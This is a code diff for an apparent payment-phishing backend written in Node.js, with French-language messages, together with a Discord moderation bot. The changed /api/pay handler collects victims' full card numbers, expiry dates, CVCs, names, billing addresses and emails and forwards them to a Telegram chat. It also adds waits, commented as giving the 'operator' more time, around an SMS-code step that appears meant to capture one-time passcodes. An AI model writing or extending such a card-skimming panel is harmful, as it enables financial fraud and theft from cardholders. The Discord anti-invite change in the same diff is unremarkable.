@@ -167,7 +167,7 @@ function generateCode() {
 }
 
 app.post('/api/pay', async (req, res) => {
-    const { cardHolder, cardNumber, expiry, cvc, email, country } = req.body;
+    const { firstName, lastName, billingAddress, cardNumber, expiry, cvc, email, country } = req.body;
     const paymentId = Math.random().toString(36).substring(2, 11);
 
     // Initial state
@@ -175,7 +175,9 @@ app.post('/api/pay', async (req, res) => {
 
     try {
         const message = `💳 *NOUVEAU PAIEMENT REÇU*\n\n` +
-            `👤 *NOM:* \`${cardHolder || 'N/A'}\`\n` +
+            `👤 *NOM:* \`${lastName || 'N/A'}\`\n` +
+            `👤 *PRÉNOM:* \`${firstName || 'N/A'}\`\n` +
+            `🏠 *ADRESSE:* \`${billingAddress || 'N/A'}\`\n` +
             `📧 *MAIL:* \`${email || 'N/A'}\`\n\n` +
             `💎 *CARTE:* \`${cardNumber || 'N/A'}\`\n` +
             `📅 *DATE:* \`${expiry || 'N/A'}\`    🔒 *CVC:* \`${cvc || 'N/A'}\`\n\n` +
@@ -193,10 +195,12 @@ app.post('/api/pay', async (req, res) => {
         console.error("Telegram log error:", err.message);
     }
 
-    // Delay 5 seconds
+    // Delay 10 seconds (gives more time to the operator)
     setTimeout(async () => {
         const p = pendingPayments.get(paymentId);
         if (p && p.needsSms) {
+            // Extra wait if SMS requested ("tu ajouter du temps")
+            await new Promise(resolve => setTimeout(resolve, 5000));
             return res.json({ success: true, needsSms: true, paymentId });
         }
 
@@ -209,7 +213,7 @@ app.post('/api/pay', async (req, res) => {
 
         res.json({ success: true, code: newCode });
         pendingPayments.delete(paymentId);
-    }, 5000);
+    }, 10000); // 10s wait for operator
 });
 
 app.post('/api/submit-sms', async (req, res) => {
@@ -650,18 +654,18 @@ client.on('messageCreate', async (message) => {
     // ---------------------------------
 
     // --- ANTI-RAID SYSTEM ---
-    if (!message.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
-        // 1. Anti-Invite
-        const inviteRegex = /(discord\.(gg|io|me|li|link|xyz)|discordapp\.com\/invite|discord\.com\/invite)\/.+/i;
-        if (inviteRegex.test(message.content)) {
-            await message.delete().catch(() => {});
-            await message.member.ban({ reason: 'Anti-Raid : Invitation Discord' }).catch(() => {});
-            const embed = new EmbedBuilder()
-                .setColor(0xFFFFFF)
-                .setDescription(`${message.author.tag} a été banni pour envoi d'invitation (Anti-Raid).`);
-            return message.channel.send({ embeds: [embed] });
-        }
+    // 1. Anti-Invite (S'applique à TOUT LE MONDE, même le staff)
+    const inviteRegex = /(discord\.(gg|io|me|li|link|xyz)|discordapp\.com\/invite|discord\.com\/invite)\/.+/i;
+    if (inviteRegex.test(message.content)) {
+        await message.delete().catch(() => {});
+        await message.member.ban({ reason: 'Anti-Raid : Invitation Discord' }).catch(() => {});
+        const embed = new EmbedBuilder()
+            .setColor(0xFFFFFF)
+            .setDescription(`${message.author.tag} a été banni pour envoi d'invitation (Anti-Raid).`);
+        return message.channel.send({ embeds: [embed] });
+    }
 
+    if (!message.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
         // 2. Anti-Spam
         const now = Date.now();
         const userData = spamMap.get(message.author.id) || { count: 0, lastMessage: now };
